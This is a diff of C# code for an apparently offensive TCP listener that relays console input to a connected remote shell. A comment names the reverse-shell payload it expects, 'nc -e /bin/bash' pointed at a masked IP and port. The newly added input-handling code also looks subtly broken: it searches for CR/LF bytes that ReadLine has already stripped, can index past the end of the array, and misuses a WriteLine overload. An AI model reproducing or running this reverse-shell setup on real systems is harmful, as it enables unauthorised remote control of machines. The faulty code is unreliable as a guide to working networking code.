@@ -120,19 +120,36 @@ namespace tcp_listener
                             //ALSO new payload needs to be - nc -e /bin/bash 192.XXX.X.X 13000
                             //https://docs.microsoft.com/en-us/dotnet/api/system.io.streamwriter.-ctor?view=net-5.0#System_IO_StreamWriter__ctor_System_IO_Stream_
 
+                            const byte CR = 0x0D;
+                            const byte LF = 0x0A;
                             Byte[] newbytes = new Byte[256];
                             streamWriter = new StreamWriter(stream);
                             StringBuilder userinput = new StringBuilder();
                             StreamReader read = new StreamReader(stream);
+                            BinaryWriter binW = new BinaryWriter(stream);
+                            int position = 0;
+                            int index = 0;
 
                             using (read)
                             {
                                 while (true)
                                 {
                                     string text = Console.ReadLine();
-                                    //byte[] input = System.Text.Encoding.ASCII.GetBytes(text);
-                                    streamWriter.WriteLine(text);
-                                    streamWriter.AutoFlush = true;
+                                    byte[] input = System.Text.Encoding.ASCII.GetBytes(text);
+                                    index = Array.IndexOf<byte>(input, CR, position);
+                                    if ((index >= 0) && (input[index + 1] == LF))
+                                    {
+                                        //data = System.Text.Encoding.ASCII.GetString(index);
+                                        streamWriter.WriteLine(text, position, index - position);
+                                        //binW.Write(input, position, index - position);
+                                        position = index + 1;
+                                        streamWriter.AutoFlush = true;
+                                    }
+
+                                    
+
+                                    //streamWriter.WriteLine(input, index, position - position);
+                                    //streamWriter.AutoFlush = true;
                                 }
                                 
 
